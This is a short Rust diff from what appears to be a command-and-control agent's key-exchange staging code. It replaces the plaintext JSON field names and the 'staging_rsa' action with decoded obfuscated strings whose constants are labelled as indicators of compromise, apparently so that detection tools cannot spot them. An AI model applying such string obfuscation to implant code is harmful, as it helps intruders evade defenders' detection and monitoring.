@@ -162,11 +162,10 @@ impl Profile {
         let mut session_id: [char; 20] = ['a'; 20];
         rand::thread_rng().try_fill(&mut session_id)?;
 
-        // Formulate the body for staging a key exchange
         let body = json!({
-            "action": "staging_rsa",
-            "pub_key": general_purpose::STANDARD.encode(public_key_pem.as_bytes()),
-            "session_id": session_id.iter().cloned().collect::<String>(),
+            &crate::obfstr::d(crate::obfstr::IOC_ACTION): crate::obfstr::d(crate::obfstr::IOC_STAGING_RSA),
+            &crate::obfstr::d(crate::obfstr::IOC_PUB_KEY): general_purpose::STANDARD.encode(public_key_pem.as_bytes()),
+            &crate::obfstr::d(crate::obfstr::IOC_SESSION_ID): session_id.iter().cloned().collect::<String>(),
         })
         .to_string();
 
